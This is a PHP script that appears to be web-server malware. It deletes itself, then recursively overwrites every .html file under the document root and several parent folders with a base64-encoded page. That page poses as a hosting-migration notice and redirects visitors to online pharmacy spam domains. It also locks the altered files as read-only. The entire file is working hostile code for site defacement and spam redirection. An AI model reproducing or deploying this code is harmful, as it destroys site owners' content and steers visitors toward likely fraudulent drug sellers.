<?php unlink(__FILE__); @ignore_user_abort (true);
set_time_limit ( 111000 );



//$x_domains = explode(',' ,  "fantopdeal.su,topsalenest.su");
//$x_gif = explode(',' ,  "1,2,3,4,7,9");
//$ggg = base64_decode("PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJlbiI+DQo8aGVhZD4NCiAgICA8dGl0bGU+RVhUUkEgT0ZGRVI8L3RpdGxlPg0KICAgIDxzdHlsZT4NCiAgICAgICAgLndyYXBwZXIgew0KICBwb3NpdGlvbjogYWJzb2x1dGU7DQogIHRvcDogMjAlOw0KICByaWdodDogMDsNCiAgYm90dG9tOiAwOw0KICBsZWZ0OiAwOw0KICBtYXJnaW46IGF1dG87DQp9DQouYm94IHsNCiANCiAgcG9zaXRpb246IGFic29sdXRlOw0KICB0b3A6IDEwJTsNCiAgcmlnaHQ6IDA7DQogIGJvdHRvbTogMDsNCiAgbGVmdDogMDsNCiAgbWFyZ2luOiBhdXRvOw0KIA0KfQ0KICAgIDwvc3R5bGU+DQo8L2hlYWQ+DQo8Ym9keT4NCjxhIGhyZWY9Imh0dHA6Ly8jI0xJTktfVVJMIyMvIj4NCiAgICA8ZGl2IGFsaWduPSJjZW50ZXIiIGNsYXNzPSJ3cmFwcGVyIj4NCg0KPGltZyBzcmM9Imh0dHA6Ly8jI0xJTktfVVJMIyMvaW1nL3Byb21vL2ltZzMwMC0yNTAtIyNJRCMjLmdpZiIgd2lkdGg9IjYwMCIgaGVpZ2h0PSI1MDAiPg0KDQo8ZGl2IGNsYXNzPSJib3giPjwvZGl2Pg0KDQo8L2Rpdj4NCjwvYT4NCjwvYm9keT4NCjwvaHRtbD4=");
//$ggg = str_replace( '##ID##',   $x_gif[array_rand($x_gif)], $ggg );
//$ggg = base64_encode(str_replace( '##LINK_URL##',   $x_domains[array_rand($x_domains)] , $ggg ));

$x_domains = explode(',' ,  "canadiandrugpillstore.shop,cheapmedplace.com,rxpillsspace.com");
$ggg = base64_decode("PCFET0NUWVBFIGh0bWw+DQo8aHRtbD4NCjxoZWFkPg0KPE1FVEEgSFRUUC1FUVVJVj0iQ0FDSEUtQ09OVFJPTCIgQ09OVEVOVD0iTk8tQ0FDSEUiPg0KPE1FVEEgSFRUUC1FUVVJVj0iUFJBR01BIiBDT05URU5UPSJOTy1DQUNIRSI+DQo8c3R5bGU+DQpib2R5IHsgbWFyZ2luOiAyMDBweDsgZm9udDogMTJwdCBoZWx2ZXRpY2E7IH0NCjwvc3R5bGU+DQoNCjwvaGVhZD4NCjxib2R5Pg0KPEJSPg0KPEJSPg0KPEJSPg0KPHA+PGEgaHJlZj0iIyNMSU5LX1VSTCMjcHJvZHVjdC9lZHRyaWFscGFjayI+PGltZyBzcmM9IiMjTElOS19VUkwjI2J1bmRsZXMvc2hvcC81L2ltYWdlcy9iYW5uZXItNC5wbmciIGFsdD0iIj48L2E+PGEgaHJlZj0iIyNMSU5LX1VSTCMjcHJvZHVjdC9nZW5lcmljdmlhZ3Jhc3VwZXJhY3RpdmUiPjxpbWcgc3JjPSIjI0xJTktfVVJMIyNidW5kbGVzL3Nob3AvNS9pbWFnZXMvYmFubmVyLTUucG5nIiBhbHQ9IiI+PC9hPjxwPg0KPC9ib2R5Pg0KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPg0KDQoNCi8vIEVkaXQgdGhlc2UgdG8gc3VpdCB5b3VyIG5lZWRzLg0KdmFyIG9sZHNpdGUgPSAiIyNMSU5LX1VSTCMjIjsNCnZhciBuZXdTaXRlID0gIiMjTElOS19VUkwjIyI7DQp2YXIgc2Vjb25kcyA9IDE1OyAgLy8gY291bnRkb3duIGRlbGF5Lg0KDQp2YXIgcGF0aCA9IGxvY2F0aW9uLnBhdGhuYW1lOw0KdmFyIHNyY2ggPSBsb2NhdGlvbi5zZWFyY2g7DQp2YXIgdW5pcSA9IE1hdGguZmxvb3IoKE1hdGgucmFuZG9tKCkgKiAxMDAwMCkgKyAxKTsNCnZhciBuZXdQYXRoID0gbmV3U2l0ZSA7IA0KDQoNCg0KDQpkb2N1bWVudC53cml0ZSAoJzxwPkFzIHBhcnQgb2YgaG9zdGluZyBpbXByb3ZlbWVudHMsIHRoZSBzeXN0ZW0gaGFzIGJlZW4gbWlncmF0ZWQgZnJvbSAnICsgb2xkc2l0ZSArICcgdG88L3A+Jyk7DQpkb2N1bWVudC53cml0ZSAoJzxwPjxhIGhyZWY9IicgKyBuZXdQYXRoICsgJyI+JyArIG5ld1NpdGUgKyAnPC9hPjwvcD4nKTsNCmRvY3VtZW50LndyaXRlICgnPHA+UGxlYXNlIHRha2Ugbm90ZSBvZiB0aGUgbmV3IHdlYnNpdGUgYWRkcmVzcy48L3A+Jyk7DQpkb2N1bWVudC53cml0ZSAoJzxwPklmIHlvdSBhcmUgbm90IGF1dG9tYXRpY2FsbHkgcmVkaXJlY3RlZCBwbGVhc2UgY2xpY2sgdGhlIGxpbmsgYWJvdmUgdG8gcHJvY2VlZC48L3A+Jyk7DQpkb2N1bWVudC53cml0ZSAoJzxwIGlkPSJkdkNvdW50RG93biI+WW91IHdpbGwgYmUgcmVkaXJlY3RlZCBhZnRlciA8c3BhbiBpZCA9ICJsYmxDb3VudCI+PC9zcGFuPiZuYnNwO3NlY29uZHMuPC9wPicpOw0KDQpmdW5jdGlvbiBEZWxheVJlZGlyZWN0KCkgew0KICAgIHZhciBkdkNvdW50RG93biA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJkdkNvdW50RG93biIpOw0KICAgIHZhciBsYmxDb3VudCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJsYmxDb3VudCIpOw0KICAgIGR2Q291bnREb3duLnN0eWxlLmRpc3BsYXkgPSAiYmxvY2siOw0KICAgIGxibENvdW50LmlubmVySFRNTCA9IHNlY29uZHM7DQogICAgc2V0SW50ZXJ2YWwoZnVuY3Rpb24gKCkgew0KICAgICAgICBzZWNvbmRzLS07DQogICAgICAgIGxibENvdW50LmlubmVySFRNTCA9IHNlY29uZHM7DQogICAgICAgIGlmIChzZWNvbmRzID09IDApIHsNCiAgICAgICAgICAgIGR2Q291bnREb3duLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7DQogICAgICAgICAgICB3aW5kb3cubG9jYXRpb24gPSBuZXdQYXRoOw0KICAgICAgICB9DQogICAgfSwgMTAwMCk7DQp9DQpEZWxheVJlZGlyZWN0KCkNCg0KPC9zY3JpcHQ+DQo8L2h0bWw+");
$ggg = base64_encode(str_replace( '##LINK_URL##',  'http://' .  $x_domains[array_rand($x_domains)]  . '/' , $ggg ));



for ($index = 0; $index <=4 ; $index++){


$atob = 0;





$shell_url = ((!empty($_SERVER['HTTPS'])) ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] ;



$server_domain = $_SERVER['HTTP_HOST'];

// ------------------------ links in all folders



$root =  $_SERVER["DOCUMENT_ROOT"];
if (strpos($root,'/') !== false) {
    $path =  $root . "/";
}
else $path = $root . "\\";

$links_replaced = 0;
$files_changed = 0;
$php_redirect = 0;

$replace_link = 'http://' . $x_domains[array_rand($x_domains)] . '/';

$root = $path;
if ($index == 0) {
$root = rtrim(dirname($root));}
else
{
 $root = rtrim(dirname($root,$index));}

echo PHP_EOL .'Folder deep ' . $index . PHP_EOL;

//break;
$realpath = $root;

//echo  $root . '     ----  ' .   $realpath . PHP_EOL;

$fileObjects = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($realpath),
                 RecursiveIteratorIterator::SELF_FIRST);

foreach($fileObjects as $key => $object){
//    if($object->getFilename() === 'filename.png') {


if (strpos($object->getFilename(), '.html' ) !== false)   {
        
$fname = $object->getPathname() ;



//echo  $shell_url . $fname . PHP_EOL . $orig_body . PHP_EOL .PHP_EOL;







$files_changed++;
chmod($fname, 0644);
file_put_contents($fname,base64_decode( $ggg));
//file_put_contents($fname,'<HTML>');
chmod($fname, 0444);

//break;

//echo file_get_contents($fname) . PHP_EOL . PHP_EOL;
//break;



}
}
echo 'Files = ' . $files_changed  . '  Links changed in  '  . $links_replaced . ' files'; 
//echo 'Domain = ' .  $server_domain .  '  Files = ' . $files_changed  . '  Links changed in  '  . $links_replaced . ' files ... atob changed : ' . $atob . '   PHP execute files old : ' . $php_redirect; 



}

